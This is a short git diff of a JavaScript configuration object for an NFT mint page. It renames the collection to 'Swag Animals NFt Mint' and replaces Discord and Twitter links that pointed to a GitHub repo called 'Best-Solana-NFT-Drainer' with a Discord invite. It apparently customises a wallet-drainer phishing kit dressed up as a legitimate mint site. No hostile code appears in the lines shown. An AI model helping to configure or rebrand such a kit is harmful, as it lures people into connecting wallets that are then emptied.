@@ -1,10 +1,10 @@
 const collectionInfo = {
-    name: "Yeah Tigers | 0x32Moon", // Name of the collection
+    name: "Swag Animals NFt Mint", // Name of the collection
     title: "{name}", 
     date: "30.06.2022", // Today Date
     socialMedia: {
-        discord: "https://github.com/0x32Moon/Best-Solana-NFT-Drainer/", // Discord link
-        twitter: "https://github.com/0x32Moon/Best-Solana-NFT-Drainer/", // Twitter link
+        discord: "https://discord.gg/Fu52QJZUHY", // Discord link
+        twitter: "https://discord.gg/Fu52QJZUHY", // Twitter link
     },
     medias: {
         preview: "gif.gif", // Location logo
